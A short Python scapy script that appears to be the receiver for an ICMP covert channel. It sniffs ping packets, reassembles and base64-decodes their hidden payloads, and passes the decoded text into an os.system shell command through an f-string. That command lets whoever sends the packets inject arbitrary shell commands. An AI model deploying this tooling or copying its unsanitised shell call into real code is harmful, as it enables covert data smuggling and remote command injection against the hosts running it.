from scapy.all import *
import base64
import os

def process_packet(packet):
    if packet.haslayer(ICMP) and packet.haslayer(Raw):
        data = packet[Raw].load
        print("Received raw data:", data.decode())
        return data

def decode_and_execute():
    packets = sniff(filter="icmp", prn=process_packet, count=10)  # Adjust count as needed
    full_data = b''.join([pkt[Raw].load for pkt in packets if pkt.haslayer(Raw)])
    
    try:
        # Decode the base64 data
        decoded_data = base64.b64decode(full_data).decode()
        print("Decoded data:", decoded_data)
        
        # Example of using the data in a bash command
        os.system(f"echo '{decoded_data}' > output.txt")
    except Exception as e:
        print("Failed to decode or execute:", e)

decode_and_execute()
